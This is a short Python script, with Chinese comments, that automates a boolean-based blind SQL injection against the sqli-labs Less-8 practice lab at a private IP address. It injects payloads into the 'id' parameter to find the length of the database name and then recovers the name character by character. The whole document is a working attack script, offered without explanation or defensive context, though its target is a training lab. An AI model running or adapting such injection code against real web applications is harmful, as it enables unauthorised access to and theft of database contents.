import requests
import string
url="http://192.168.200.148/sqli-labs-master/Less-8/"

req=requests.session()
# 确定数据库名的长度
for i in range(1,51):
    params={
        'id': f" 1' and length(database())={i} -- "
    }
    res=req.get(url=url,params=params)
    if "You are in......" in res.text:
        dbname_len=i
        break
print(f"[+] The length of dbname is {i}")

# 确定数据库名
c_set=string.printable.strip()
db_name=""
for i in range(1,dbname_len+1):
   for  j in c_set :
        params={
        'id': f" 1' and substr(database(),{i},1)='{j}' -- "
        }
        res=req.get(url=url,params=params)
        if "You are in......" in res.text:
            db_name+=j
            break
print(f"[+] name of The Database is {db_name}")